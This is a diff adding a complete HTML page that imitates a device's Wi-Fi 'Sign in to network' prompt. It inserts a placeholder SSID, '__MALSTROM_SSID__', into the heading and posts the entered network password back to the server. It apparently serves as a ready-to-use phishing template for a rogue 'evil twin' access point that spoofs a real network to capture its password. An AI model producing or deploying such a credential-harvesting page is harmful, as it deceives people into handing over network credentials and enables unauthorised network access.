@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in to network</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Roboto,-apple-system,"Segoe UI",Arial,sans-serif;background:#111318;color:#e2e4e9;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.sheet{width:100%;max-width:420px;background:#1a1d23;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,.5)}
+.head{background:#20242c;padding:18px 24px;display:flex;align-items:center;gap:14px;border-bottom:1px solid #2c3038}
+.head h1{font-size:16px;font-weight:500;flex:1}
+.head .dots{color:#5a606b;font-size:10px;letter-spacing:2px}
+.body{padding:26px 24px}
+.ico{width:58px;height:58px;margin:0 auto 18px;border-radius:50%;background:#2c3038;display:flex;align-items:center;justify-content:center}
+.ico svg{width:28px;height:28px;fill:#4c8dff}
+h2{font-size:17px;font-weight:500;text-align:center;margin-bottom:4px}
+p{font-size:13px;color:#9aa0aa;text-align:center;margin-bottom:24px}
+label{display:block;font-size:12px;color:#9aa0aa;margin-bottom:6px}
+input{width:100%;background:#14161b;border:1px solid #343942;border-radius:8px;padding:12px 14px;color:#e2e4e9;font-size:15px;outline:none}
+input:focus{border-color:#4c8dff}
+button{width:100%;background:#2f6df6;border:none;border-radius:8px;padding:13px;color:#fff;font-size:15px;font-weight:500;cursor:pointer;margin-top:16px}
+button:active{background:#2758c6}
+.small{font-size:11px;color:#6b7078;text-align:center;margin-top:16px}
+</style>
+</head>
+<body>
+<div class="sheet">
+  <div class="head">
+    <div class="dots">&#9679; &#9679; &#9679;</div>
+  </div>
+  <div class="body">
+    <div class="ico"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM6 8h4v2H8v6H6V8zm12 0h-4v8h-2v-6h-2V8h8z"/></svg></div>
+    <h2>Sign in to "__MALSTROM_SSID__"</h2>
+    <p>Enter your network credentials to continue.</p>
+      <form id="f" action="/" method="post">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" autocomplete="current-password" required autofocus>
+      <button type="submit">Sign in</button>
+    </form>
+    <div class="small">Protected network</div>
+  </div>
+</div>
+</body>
+</html>
